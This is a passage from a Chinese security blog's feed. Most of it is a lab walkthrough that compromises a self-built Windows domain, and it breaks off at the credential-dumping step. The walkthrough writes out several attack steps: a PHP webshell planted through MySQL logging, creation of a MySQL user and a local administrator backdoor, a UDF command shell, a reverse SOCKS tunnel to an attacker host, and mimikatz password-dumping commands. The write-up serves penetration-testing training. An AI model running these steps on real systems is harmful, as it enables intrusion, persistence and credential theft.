<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/CVE-2018-8174%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20180627212029_bxawG8_Screenshot.jpeg" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-序言&quot;&gt;&lt;a href=&quot;#0x00-序言&quot; class=&quot;headerlink&quot; title=&quot;0x00. 序言&quot;&gt;&lt;/a&gt;0x00. 序言&lt;/h2&gt;&lt;h4 id=&quot;emsp-emsp-漏洞描述CVE-2018-8174是-Windows-VBScript-Engine-代码执行漏洞。由于VBScript脚本执行引擎-vbscript-dll-存在代码执行漏洞，攻击者可以将恶意的VBScript嵌入到Office文件或者网站中，一旦用户不小心点击，远程攻击者可以获取当前用户权限执行脚本中的恶意代码，该漏洞影响最新版本的32位-IE浏览器及使用了IE内核的应用程序。&quot;&gt;&lt;a href=&quot;#emsp-emsp-漏洞描述CVE-2018-8174是-Windows-VBScript-Engine-代码执行漏洞。由于VBScript脚本执行引擎-vbscript-dll-存在代码执行漏洞，攻击者可以将恶意的VBScript嵌入到Office文件或者网站中，一旦用户不小心点击，远程攻击者可以获取当前用户权限执行脚本中的恶意代码，该漏洞影响最新版本的32位-IE浏览器及使用了IE内核的应用程序。&quot; class=&quot;headerlink&quot; title=&quot;&amp;emsp;&amp;emsp;漏洞描述CVE-2018-8174是 Windows VBScript Engine 代码执行漏洞。由于VBScript脚本执行引擎(vbscript.dll)存在代码执行漏洞，攻击者可以将恶意的VBScript嵌入到Office文件或者网站中，一旦用户不小心点击，远程攻击者可以获取当前用户权限执行脚本中的恶意代码，该漏洞影响最新版本的32位 IE浏览器及使用了IE内核的应用程序。&quot;&gt;&lt;/a&gt;&amp;emsp;&amp;emsp;漏洞描述CVE-2018-8174是 Windows VBScript Engine 代码执行漏洞。由于VBScript脚本执行引擎(vbscript.dll)存在代码执行漏洞，攻击者可以将恶意的VBScript嵌入到Office文件或者网站中，一旦用户不小心点击，远程攻击者可以获取当前用户权限执行脚本中的恶意代码，该漏洞影响最新版本的32位 IE浏览器及使用了IE内核的应用程序。&lt;/h4&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>SQL注入导图</title>
    <link href="http://TimeS0ng.github.io/2018/06/04/SQL%E6%B3%A8%E5%85%A5%E5%AF%BC%E5%9B%BE/"/>
    <id>http://TimeS0ng.github.io/2018/06/04/SQL注入导图/</id>
    <published>2018-06-04T03:06:52.000Z</published>
    <updated>2019-01-25T01:21:27.023Z</updated>
    
    <content type="html"><![CDATA[<h4 id="本图来自信安之路学生渗透小组-辽宁-web-TwoDog-博主觉得这张图画的很好，所以贴在这里提供参考！"><a href="#本图来自信安之路学生渗透小组-辽宁-web-TwoDog-博主觉得这张图画的很好，所以贴在这里提供参考！" class="headerlink" title="本图来自信安之路学生渗透小组@辽宁-web-TwoDog, 博主觉得这张图画的很好，所以贴在这里提供参考！"></a>本图来自信安之路学生渗透小组@辽宁-web-TwoDog, 博主觉得这张图画的很好，所以贴在这里提供参考！</h4><a id="more"></a>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/SQL%E6%B3%A8%E5%85%A5%E5%AF%BC%E5%9B%BE/20180604110147_oMGlv3_B11A99714D2D907A004073CD49DA4CB6.jpeg" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;本图来自信安之路学生渗透小组-辽宁-web-TwoDog-博主觉得这张图画的很好，所以贴在这里提供参考！&quot;&gt;&lt;a href=&quot;#本图来自信安之路学生渗透小组-辽宁-web-TwoDog-博主觉得这张图画的很好，所以贴在这里提供参考！&quot; class=&quot;headerlink&quot; title=&quot;本图来自信安之路学生渗透小组@辽宁-web-TwoDog, 博主觉得这张图画的很好，所以贴在这里提供参考！&quot;&gt;&lt;/a&gt;本图来自信安之路学生渗透小组@辽宁-web-TwoDog, 博主觉得这张图画的很好，所以贴在这里提供参考！&lt;/h4&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>漫谈攻击链--从webshell到域控的奇妙之旅</title>
    <link href="http://TimeS0ng.github.io/2018/06/04/%E6%BC%AB%E8%B0%88%E6%94%BB%E5%87%BB%E9%93%BE-%E4%BB%8Ewebshell%E5%88%B0%E5%9F%9F%E6%8E%A7%E7%9A%84%E5%A5%87%E5%A6%99%E4%B9%8B%E6%97%85/"/>
    <id>http://TimeS0ng.github.io/2018/06/04/漫谈攻击链-从webshell到域控的奇妙之旅/</id>
    <published>2018-06-04T02:52:53.000Z</published>
    <updated>2019-01-25T01:12:59.951Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-引言"><a href="#0x00-引言" class="headerlink" title="0x00. 引言"></a>0x00. 引言</h2><h4 id="emsp-emsp-做渗透测试时遇到的域环境经常就是要么太复杂我们搞不定，要么太简单进去就拿到域控没啥意思，这些显然都无法满足我们实践已掌握知识的刚需。同时为了给我们道格安全技术小组的小伙伴们搭建线下实战环境，笔者索性自己搭建了一套完整的域环境，通过实战时遇到的一些坑来配备合适的漏洞，让域渗透不再神秘，也大大增加我们对知识的理解程度，下面我将为大家揭露从web到域控的奇妙旅程！文末有相关下载链接。本文已投freebuf，禁止转载！"><a href="#emsp-emsp-做渗透测试时遇到的域环境经常就是要么太复杂我们搞不定，要么太简单进去就拿到域控没啥意思，这些显然都无法满足我们实践已掌握知识的刚需。同时为了给我们道格安全技术小组的小伙伴们搭建线下实战环境，笔者索性自己搭建了一套完整的域环境，通过实战时遇到的一些坑来配备合适的漏洞，让域渗透不再神秘，也大大增加我们对知识的理解程度，下面我将为大家揭露从web到域控的奇妙旅程！文末有相关下载链接。本文已投freebuf，禁止转载！" class="headerlink" title="&emsp;&emsp;做渗透测试时遇到的域环境经常就是要么太复杂我们搞不定，要么太简单进去就拿到域控没啥意思，这些显然都无法满足我们实践已掌握知识的刚需。同时为了给我们道格安全技术小组的小伙伴们搭建线下实战环境，笔者索性自己搭建了一套完整的域环境，通过实战时遇到的一些坑来配备合适的漏洞，让域渗透不再神秘，也大大增加我们对知识的理解程度，下面我将为大家揭露从web到域控的奇妙旅程！文末有相关下载链接。本文已投freebuf，禁止转载！"></a>&emsp;&emsp;做渗透测试时遇到的域环境经常就是要么太复杂我们搞不定，要么太简单进去就拿到域控没啥意思，这些显然都无法满足我们实践已掌握知识的刚需。同时为了给我们道格安全技术小组的小伙伴们搭建线下实战环境，笔者索性自己搭建了一套完整的域环境，通过实战时遇到的一些坑来配备合适的漏洞，让域渗透不再神秘，也大大增加我们对知识的理解程度，下面我将为大家揭露从web到域控的奇妙旅程！文末有相关下载链接。<a href="http://www.freebuf.com/articles/network/172578.html" target="_blank" rel="external">本文已投freebuf，禁止转载！</a></h4><a id="more"></a>
<h2 id="0x01-渗透环境"><a href="#0x01-渗透环境" class="headerlink" title="0x01. 渗透环境"></a>0x01. 渗透环境</h2><h4 id="emsp-emsp-此次域环境不是特别复杂，但是却包含了大部分渗透时需要掌握的知识，所以请诸位放心食用。"><a href="#emsp-emsp-此次域环境不是特别复杂，但是却包含了大部分渗透时需要掌握的知识，所以请诸位放心食用。" class="headerlink" title="&emsp;&emsp;此次域环境不是特别复杂，但是却包含了大部分渗透时需要掌握的知识，所以请诸位放心食用。"></a>&emsp;&emsp;此次域环境不是特别复杂，但是却包含了大部分渗透时需要掌握的知识，所以请诸位放心食用。</h4><h4 id="emsp-emsp-我们的入口只有一个w2k3搭建的web静态站点，我利用防火墙将对内网的访问阻挡在外部，但是将1-1-1-21的80端口映射到防火墙的80端口，所以我们只有通过webshell进入内网才能进一步控制域环境。此次环境的上帝视角如下："><a href="#emsp-emsp-我们的入口只有一个w2k3搭建的web静态站点，我利用防火墙将对内网的访问阻挡在外部，但是将1-1-1-21的80端口映射到防火墙的80端口，所以我们只有通过webshell进入内网才能进一步控制域环境。此次环境的上帝视角如下：" class="headerlink" title="&emsp;&emsp;我们的入口只有一个w2k3搭建的web静态站点，我利用防火墙将对内网的访问阻挡在外部，但是将1.1.1.21的80端口映射到防火墙的80端口，所以我们只有通过webshell进入内网才能进一步控制域环境。此次环境的上帝视角如下："></a>&emsp;&emsp;我们的入口只有一个w2k3搭建的web静态站点，我利用防火墙将对内网的访问阻挡在外部，但是将1.1.1.21的80端口映射到防火墙的80端口，所以我们只有通过webshell进入内网才能进一步控制域环境。此次环境的上帝视角如下：</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/%E6%BC%AB%E8%B0%88%E6%94%BB%E5%87%BB%E9%93%BE--%E4%BB%8Ewebshell%E5%88%B0%E5%9F%9F%E6%8E%A7%E7%9A%84%E5%A5%87%E5%A6%99%E4%B9%8B%E6%97%85/20180519102901_yt92TP_Screenshot.jpeg" alt=""></p>
<h2 id="0x02-web渗透"><a href="#0x02-web渗透" class="headerlink" title="0x02. web渗透"></a>0x02. web渗透</h2><h4 id="emsp-emsp-首先打开我们获取的web站点地址http-192-168-1-106-可以看到这是一个纯静态界面，一般遇到这种静态页面的环境我们可以选择先用御剑扫一扫目录或者用fierce爆破子域名，我这里没有设置域名更没有子域名，所以我就直接用御剑爆破目录了！"><a href="#emsp-emsp-首先打开我们获取的web站点地址http-192-168-1-106-可以看到这是一个纯静态界面，一般遇到这种静态页面的环境我们可以选择先用御剑扫一扫目录或者用fierce爆破子域名，我这里没有设置域名更没有子域名，所以我就直接用御剑爆破目录了！" class="headerlink" title="&emsp;&emsp;首先打开我们获取的web站点地址http://192.168.1.106 可以看到这是一个纯静态界面，一般遇到这种静态页面的环境我们可以选择先用御剑扫一扫目录或者用fierce爆破子域名，我这里没有设置域名更没有子域名，所以我就直接用御剑爆破目录了！"></a>&emsp;&emsp;首先打开我们获取的web站点地址<a href="http://192.168.1.106" target="_blank" rel="external">http://192.168.1.106</a> 可以看到这是一个纯静态界面，一般遇到这种静态页面的环境我们可以选择先用御剑扫一扫目录或者用fierce爆破子域名，我这里没有设置域名更没有子域名，所以我就直接用御剑爆破目录了！</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/%E6%BC%AB%E8%B0%88%E6%94%BB%E5%87%BB%E9%93%BE--%E4%BB%8Ewebshell%E5%88%B0%E5%9F%9F%E6%8E%A7%E7%9A%84%E5%A5%87%E5%A6%99%E4%B9%8B%E6%97%85/20180519103537_TL8yGs_Screenshot.jpeg" alt=""></p>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/%E6%BC%AB%E8%B0%88%E6%94%BB%E5%87%BB%E9%93%BE--%E4%BB%8Ewebshell%E5%88%B0%E5%9F%9F%E6%8E%A7%E7%9A%84%E5%A5%87%E5%A6%99%E4%B9%8B%E6%97%85/20180519104344_KmT5nJ_Screenshot.jpeg" alt=""></p>
<h4 id="emsp-emsp-爆破出来的目录比较全，接下来进行信息收集，看看能获取到什么有用的信息，一般如果能爆破出robots-txt文件的话千万记住要看看里面有什么站点，一般我们可以从那里面收集比较多实用的信息。通过逐一访问对我们较有用的地址有test-php、phpmyadmin-其他地址基本都是静态或者用不了。"><a href="#emsp-emsp-爆破出来的目录比较全，接下来进行信息收集，看看能获取到什么有用的信息，一般如果能爆破出robots-txt文件的话千万记住要看看里面有什么站点，一般我们可以从那里面收集比较多实用的信息。通过逐一访问对我们较有用的地址有test-php、phpmyadmin-其他地址基本都是静态或者用不了。" class="headerlink" title="&emsp;&emsp;爆破出来的目录比较全，接下来进行信息收集，看看能获取到什么有用的信息，一般如果能爆破出robots.txt文件的话千万记住要看看里面有什么站点，一般我们可以从那里面收集比较多实用的信息。通过逐一访问对我们较有用的地址有test.php、phpmyadmin/ 其他地址基本都是静态或者用不了。"></a>&emsp;&emsp;爆破出来的目录比较全，接下来进行信息收集，看看能获取到什么有用的信息，一般如果能爆破出robots.txt文件的话千万记住要看看里面有什么站点，一般我们可以从那里面收集比较多实用的信息。通过逐一访问对我们较有用的地址有test.php、phpmyadmin/ 其他地址基本都是静态或者用不了。</h4><h4 id="emsp-emsp-在test-php下面有管理员用于测试使用过的phpinfo-，通过它我们搜集到网站的根目录-G-apm-apache2-htdocs-还有Apache、PHP版本，操作系统等一系列对我们后续渗透很有用的信息，这里记得打开文本记录一下。"><a href="#emsp-emsp-在test-php下面有管理员用于测试使用过的phpinfo-，通过它我们搜集到网站的根目录-G-apm-apache2-htdocs-还有Apache、PHP版本，操作系统等一系列对我们后续渗透很有用的信息，这里记得打开文本记录一下。" class="headerlink" title="&emsp;&emsp;在test.php下面有管理员用于测试使用过的phpinfo()，通过它我们搜集到网站的根目录 G:/apm/apache2/htdocs 还有Apache、PHP版本，操作系统等一系列对我们后续渗透很有用的信息，这里记得打开文本记录一下。"></a>&emsp;&emsp;在test.php下面有管理员用于测试使用过的phpinfo()，通过它我们搜集到网站的根目录 G:/apm/apache2/htdocs 还有Apache、PHP版本，操作系统等一系列对我们后续渗透很有用的信息，这里记得打开文本记录一下。</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/%E6%BC%AB%E8%B0%88%E6%94%BB%E5%87%BB%E9%93%BE--%E4%BB%8Ewebshell%E5%88%B0%E5%9F%9F%E6%8E%A7%E7%9A%84%E5%A5%87%E5%A6%99%E4%B9%8B%E6%97%85/20180519105043_4G3NCI_Screenshot.jpeg" alt=""></p>
<h4 id="emsp-emsp-进入phpMyAdmin之后利用默认密码登陆不上去，尝试使用phpMyAdmin爆破工具进行弱口令爆破，因为这个web站点唯一可以供我们控制的就只有phpMyAdmin-这一个页面了，所以必须拿下，不然就无法进行后续操作。"><a href="#emsp-emsp-进入phpMyAdmin之后利用默认密码登陆不上去，尝试使用phpMyAdmin爆破工具进行弱口令爆破，因为这个web站点唯一可以供我们控制的就只有phpMyAdmin-这一个页面了，所以必须拿下，不然就无法进行后续操作。" class="headerlink" title="&emsp;&emsp;进入phpMyAdmin之后利用默认密码登陆不上去，尝试使用phpMyAdmin爆破工具进行弱口令爆破，因为这个web站点唯一可以供我们控制的就只有phpMyAdmin/这一个页面了，所以必须拿下，不然就无法进行后续操作。"></a>&emsp;&emsp;进入phpMyAdmin之后利用默认密码登陆不上去，尝试使用phpMyAdmin爆破工具进行弱口令爆破，因为这个web站点唯一可以供我们控制的就只有phpMyAdmin/这一个页面了，所以必须拿下，不然就无法进行后续操作。</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/%E6%BC%AB%E8%B0%88%E6%94%BB%E5%87%BB%E9%93%BE--%E4%BB%8Ewebshell%E5%88%B0%E5%9F%9F%E6%8E%A7%E7%9A%84%E5%A5%87%E5%A6%99%E4%B9%8B%E6%97%85/20180519110155_HASASl_Screenshot.jpeg" alt=""></p>
<h4 id="拿到账号密码之后直接登陆上去利用-INTO-OUTFIEL-写免杀一句话木马，记住一定要指定正确的web根目录。但是运行的sql语句却被–secure-file-priv拦截了，这个默认配置让我们无法通过sql写文件，看来直接写木马是不现实了。"><a href="#拿到账号密码之后直接登陆上去利用-INTO-OUTFIEL-写免杀一句话木马，记住一定要指定正确的web根目录。但是运行的sql语句却被–secure-file-priv拦截了，这个默认配置让我们无法通过sql写文件，看来直接写木马是不现实了。" class="headerlink" title="拿到账号密码之后直接登陆上去利用 INTO OUTFIEL 写免杀一句话木马，记住一定要指定正确的web根目录。但是运行的sql语句却被–secure-file-priv拦截了，这个默认配置让我们无法通过sql写文件，看来直接写木马是不现实了。"></a>拿到账号密码之后直接登陆上去利用 INTO OUTFIEL 写免杀一句话木马，记住一定要指定正确的web根目录。但是运行的sql语句却被–secure-file-priv拦截了，这个默认配置让我们无法通过sql写文件，看来直接写木马是不现实了。</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/%E6%BC%AB%E8%B0%88%E6%94%BB%E5%87%BB%E9%93%BE--%E4%BB%8Ewebshell%E5%88%B0%E5%9F%9F%E6%8E%A7%E7%9A%84%E5%A5%87%E5%A6%99%E4%B9%8B%E6%97%85/20180519110834_n7WMwd_Screenshot.jpeg" alt=""></p>
<h4 id="大家遇到问题一定要记住谷歌谷歌再谷歌，只要是问题大部分都会有相应的解决方法，这里也不例外，尽管不能直接写文件，那我修改日志文件并不为过吧！我们利用sql语句启动日志记录，将日志文件设置为根目录下的config-php，利用日志记录将一句话写进去，这样就能变相写入文件了！"><a href="#大家遇到问题一定要记住谷歌谷歌再谷歌，只要是问题大部分都会有相应的解决方法，这里也不例外，尽管不能直接写文件，那我修改日志文件并不为过吧！我们利用sql语句启动日志记录，将日志文件设置为根目录下的config-php，利用日志记录将一句话写进去，这样就能变相写入文件了！" class="headerlink" title="大家遇到问题一定要记住谷歌谷歌再谷歌，只要是问题大部分都会有相应的解决方法，这里也不例外，尽管不能直接写文件，那我修改日志文件并不为过吧！我们利用sql语句启动日志记录，将日志文件设置为根目录下的config.php，利用日志记录将一句话写进去，这样就能变相写入文件了！"></a>大家遇到问题一定要记住谷歌谷歌再谷歌，只要是问题大部分都会有相应的解决方法，这里也不例外，尽管不能直接写文件，那我修改日志文件并不为过吧！我们利用sql语句启动日志记录，将日志文件设置为根目录下的config.php，利用日志记录将一句话写进去，这样就能变相写入文件了！</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">set global general_log=&apos;on&apos;;</div><div class="line">set global general_log_file=&apos;G:/apm/apache2/htdocs/config.php&apos;;</div><div class="line">select &quot;&lt;?php ($_=@$_GET[a]).@$_($_POST[&apos;cmd&apos;]); ?&gt;&quot;;</div><div class="line">set global general_log=off;</div></pre></td></tr></table></figure>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/%E6%BC%AB%E8%B0%88%E6%94%BB%E5%87%BB%E9%93%BE--%E4%BB%8Ewebshell%E5%88%B0%E5%9F%9F%E6%8E%A7%E7%9A%84%E5%A5%87%E5%A6%99%E4%B9%8B%E6%97%85/20180519111553_ytsySz_Screenshot.jpeg" alt=""></p>
<h4 id="既然一句话写进去了，此时直接用菜刀连，果然是武功再高也怕菜刀！连上去之后先看看我们当前账号拥有什么权限，权限过低的话需要提权！可以看到我们只拿到了域成员DMEMBER中的主机普通用户账号times0ng，连域账号都不是，太low啦！"><a href="#既然一句话写进去了，此时直接用菜刀连，果然是武功再高也怕菜刀！连上去之后先看看我们当前账号拥有什么权限，权限过低的话需要提权！可以看到我们只拿到了域成员DMEMBER中的主机普通用户账号times0ng，连域账号都不是，太low啦！" class="headerlink" title="既然一句话写进去了，此时直接用菜刀连，果然是武功再高也怕菜刀！连上去之后先看看我们当前账号拥有什么权限，权限过低的话需要提权！可以看到我们只拿到了域成员DMEMBER中的主机普通用户账号times0ng，连域账号都不是，太low啦！"></a>既然一句话写进去了，此时直接用菜刀连，果然是武功再高也怕菜刀！连上去之后先看看我们当前账号拥有什么权限，权限过低的话需要提权！可以看到我们只拿到了域成员DMEMBER中的主机普通用户账号times0ng，连域账号都不是，太low啦！</h4><blockquote>
<p>url = <a href="http://192.168.1.106/config.php?a=assert" target="_blank" rel="external">http://192.168.1.106/config.php?a=assert</a>  post=cmd</p>
</blockquote>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/%E6%BC%AB%E8%B0%88%E6%94%BB%E5%87%BB%E9%93%BE--%E4%BB%8Ewebshell%E5%88%B0%E5%9F%9F%E6%8E%A7%E7%9A%84%E5%A5%87%E5%A6%99%E4%B9%8B%E6%97%85/20180519112536_9JPgYj_Screenshot.jpeg" alt=""></p>
<h2 id="0x03-数据库提权"><a href="#0x03-数据库提权" class="headerlink" title="0x03. 数据库提权"></a>0x03. 数据库提权</h2><h4 id="既然如此我选择使用数据库udf提权，当然也可以利用其他方法提权，这里随意发挥就好。要使用数据库提权的前提是要将udf-dll文件写到G-apm-Mysql-lib-plugin-目录下，还要有一个可供外部连接的数据库账号。"><a href="#既然如此我选择使用数据库udf提权，当然也可以利用其他方法提权，这里随意发挥就好。要使用数据库提权的前提是要将udf-dll文件写到G-apm-Mysql-lib-plugin-目录下，还要有一个可供外部连接的数据库账号。" class="headerlink" title="既然如此我选择使用数据库udf提权，当然也可以利用其他方法提权，这里随意发挥就好。要使用数据库提权的前提是要将udf.dll文件写到G:\apm\Mysql\lib\plugin\目录下，还要有一个可供外部连接的数据库账号。"></a>既然如此我选择使用数据库udf提权，当然也可以利用其他方法提权，这里随意发挥就好。要使用数据库提权的前提是要将udf.dll文件写到G:\apm\Mysql\lib\plugin\目录下，还要有一个可供外部连接的数据库账号。</h4><h4 id="写文件sql语句不行，但是菜刀可以，这解决了第一个问题；创建一个可供外部连接的数据库账号可以利用刚才拿到的phpMyAdimin创建，所有问题都迎刃而解！"><a href="#写文件sql语句不行，但是菜刀可以，这解决了第一个问题；创建一个可供外部连接的数据库账号可以利用刚才拿到的phpMyAdimin创建，所有问题都迎刃而解！" class="headerlink" title="写文件sql语句不行，但是菜刀可以，这解决了第一个问题；创建一个可供外部连接的数据库账号可以利用刚才拿到的phpMyAdimin创建，所有问题都迎刃而解！"></a>写文件sql语句不行，但是菜刀可以，这解决了第一个问题；创建一个可供外部连接的数据库账号可以利用刚才拿到的phpMyAdimin创建，所有问题都迎刃而解！</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">GRANT ALL PRIVILEGES ON *.* TO &apos;test&apos;@&apos;%&apos; IDENTIFIED BY &apos;mysqltoor&apos; WITH GRANT OPTION; </div><div class="line">FLUSH PRIVILEGES;</div></pre></td></tr></table></figure>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/%E6%BC%AB%E8%B0%88%E6%94%BB%E5%87%BB%E9%93%BE--%E4%BB%8Ewebshell%E5%88%B0%E5%9F%9F%E6%8E%A7%E7%9A%84%E5%A5%87%E5%A6%99%E4%B9%8B%E6%97%85/20180519113453_p5Fe1K_Screenshot.jpeg" alt=""></p>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/%E6%BC%AB%E8%B0%88%E6%94%BB%E5%87%BB%E9%93%BE--%E4%BB%8Ewebshell%E5%88%B0%E5%9F%9F%E6%8E%A7%E7%9A%84%E5%A5%87%E5%A6%99%E4%B9%8B%E6%97%85/20180519113558_iSlUo0_Screenshot.jpeg" alt=""></p>
<h4 id="现在可以打开我的mysql提权工具进行提权啦，心情是不是莫名的好！首先创建一个cmdshell函数用于执行我们的命令，然后就可以创建管理员账号密码啦，这里我创建了一个test账号；同时打开靶机的3389端口供我们连接！"><a href="#现在可以打开我的mysql提权工具进行提权啦，心情是不是莫名的好！首先创建一个cmdshell函数用于执行我们的命令，然后就可以创建管理员账号密码啦，这里我创建了一个test账号；同时打开靶机的3389端口供我们连接！" class="headerlink" title="现在可以打开我的mysql提权工具进行提权啦，心情是不是莫名的好！首先创建一个cmdshell函数用于执行我们的命令，然后就可以创建管理员账号密码啦，这里我创建了一个test账号；同时打开靶机的3389端口供我们连接！"></a>现在可以打开我的mysql提权工具进行提权啦，心情是不是莫名的好！首先创建一个cmdshell函数用于执行我们的命令，然后就可以创建管理员账号密码啦，这里我创建了一个test账号；同时打开靶机的3389端口供我们连接！</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">Create Function cmdshell returns string soname &apos;udf.dll&apos;;</div><div class="line">select cmdshell(&apos;net user test admin@123 /add&apos;);</div><div class="line">select cmdshell(&apos;net localgroup administrators /add test&apos;);</div><div class="line">drop function cmdshell;</div><div class="line"></div><div class="line">Create Function open3389 returns string soname &apos;udf.dll&apos;;</div><div class="line">select open3389();</div><div class="line">drop function open3389;</div></pre></td></tr></table></figure>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/%E6%BC%AB%E8%B0%88%E6%94%BB%E5%87%BB%E9%93%BE--%E4%BB%8Ewebshell%E5%88%B0%E5%9F%9F%E6%8E%A7%E7%9A%84%E5%A5%87%E5%A6%99%E4%B9%8B%E6%97%85/20180519114403_RJqz70_Screenshot.jpeg" alt=""></p>
<h2 id="0x04-建立隧道"><a href="#0x04-建立隧道" class="headerlink" title="0x04. 建立隧道"></a>0x04. 建立隧道</h2><h4 id="虽然打开了靶机的3389端口，但是我们和靶机之间依旧隔着一堵碍眼的防火墙，无法直接连到靶机的3389上面去。不过没关系，本来就是练习技术嘛，所以接下来我将利用ew打穿一条socks5隧道！然后我们就能在内网中畅通无阻啦！不过在这之前我们还是需要先利用菜刀将ew客户端传到靶机上面去！"><a href="#虽然打开了靶机的3389端口，但是我们和靶机之间依旧隔着一堵碍眼的防火墙，无法直接连到靶机的3389上面去。不过没关系，本来就是练习技术嘛，所以接下来我将利用ew打穿一条socks5隧道！然后我们就能在内网中畅通无阻啦！不过在这之前我们还是需要先利用菜刀将ew客户端传到靶机上面去！" class="headerlink" title="虽然打开了靶机的3389端口，但是我们和靶机之间依旧隔着一堵碍眼的防火墙，无法直接连到靶机的3389上面去。不过没关系，本来就是练习技术嘛，所以接下来我将利用ew打穿一条socks5隧道！然后我们就能在内网中畅通无阻啦！不过在这之前我们还是需要先利用菜刀将ew客户端传到靶机上面去！"></a>虽然打开了靶机的3389端口，但是我们和靶机之间依旧隔着一堵碍眼的防火墙，无法直接连到靶机的3389上面去。不过没关系，本来就是练习技术嘛，所以接下来我将利用ew打穿一条socks5隧道！然后我们就能在内网中畅通无阻啦！不过在这之前我们还是需要先利用菜刀将ew客户端传到靶机上面去！</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">###################################</div><div class="line"># 攻击者在公网IP上 运行：</div><div class="line">./ew_for_linux64 -s rcsocks -l 1080 -e 8888  //在公网上侦听1080端口，并把来自1080端口的流量重定向到8888端口</div><div class="line"># 受害者运行:</div><div class="line">ew_for_Win.exe -s rssocks -d [攻击者公网IP] -e 8888   </div><div class="line"># 然后 vim /etc/proxychains.conf 配置代理文件为：</div><div class="line">socks5 [攻击者公网IP] 1080     </div><div class="line"># 最后利用proxychains 执行命令</div><div class="line">proxychains rdesktop [受害者IP]:3389</div><div class="line">###################################</div></pre></td></tr></table></figure>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/%E6%BC%AB%E8%B0%88%E6%94%BB%E5%87%BB%E9%93%BE--%E4%BB%8Ewebshell%E5%88%B0%E5%9F%9F%E6%8E%A7%E7%9A%84%E5%A5%87%E5%A6%99%E4%B9%8B%E6%97%85/20180519120038_IAO2LB_Screenshot.jpeg" alt=""></p>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/%E6%BC%AB%E8%B0%88%E6%94%BB%E5%87%BB%E9%93%BE--%E4%BB%8Ewebshell%E5%88%B0%E5%9F%9F%E6%8E%A7%E7%9A%84%E5%A5%87%E5%A6%99%E4%B9%8B%E6%97%85/20180519120254_Dzvr86_Screenshot.jpeg" alt=""></p>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/%E6%BC%AB%E8%B0%88%E6%94%BB%E5%87%BB%E9%93%BE--%E4%BB%8Ewebshell%E5%88%B0%E5%9F%9F%E6%8E%A7%E7%9A%84%E5%A5%87%E5%A6%99%E4%B9%8B%E6%97%85/20180519120601_zj3thc_Screenshot.jpeg" alt=""></p>
<h2 id="0x05-密码窃取"><a href="#0x05-密码窃取" class="headerlink" title="0x05. 密码窃取"></a>0x05. 密码窃取</h2><h4 id="我们此时已经以管理员身份登陆了w2k3了，那么接下来可以上传一个mimikatz来窃取w2k3上的账号密码。下图所示是用mimikatz获取到的域成员的账号密码，同时还获取到本地管理员administrator的密码Admin"><a href="#我们此时已经以管理员身份登陆了w2k3了，那么接下来可以上传一个mimikatz来窃取w2k3上的账号密码。下图所示是用mimikatz获取到的域成员的账号密码，同时还获取到本地管理员administrator的密码Admin" class="headerlink" title="我们此时已经以管理员身份登陆了w2k3了，那么接下来可以上传一个mimikatz来窃取w2k3上的账号密码。下图所示是用mimikatz获取到的域成员的账号密码，同时还获取到本地管理员administrator的密码Admin!@"></a>我们此时已经以管理员身份登陆了w2k3了，那么接下来可以上传一个mimikatz来窃取w2k3上的账号密码。下图所示是用mimikatz获取到的域成员的账号密码，同时还获取到本地管理员administrator的密码Admin!@</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">privilege::debug</div><div class="line">sekurlsa::logonpasswords</div></pre></td></tr></table></figure>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/%E6%BC%AB%E8%B0%88%E6%94%BB%E5%87%BB%E9%93%BE--%E4%BB%8Ewebshell%E5%88%B0%E5%9F%9F%E6%8E%A7%E7%9A%84%E5%A5%87%E5%A6%99%E4%B9%8B%E6%97%85/20180519121717_XCuZPm_Screenshot.jpeg" alt=""></p>
